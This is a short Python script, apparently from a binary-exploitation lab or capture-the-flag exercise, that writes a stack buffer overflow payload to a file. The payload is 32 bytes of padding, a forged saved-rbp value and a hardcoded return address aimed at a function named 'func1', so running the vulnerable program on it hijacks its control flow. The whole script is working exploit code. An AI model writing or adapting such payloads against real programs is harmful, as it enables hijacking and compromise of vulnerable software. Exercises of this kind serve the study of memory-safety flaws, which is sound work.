padding = b"r" * 32
rbp=b"\x00\xcd\xff\xff\xff\x7f\x00\x00" 
func1_address = b"\x2b\x12\x40\x00\x00\x00\x00\x00"  
payload = padding+rbp+ func1_address

with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")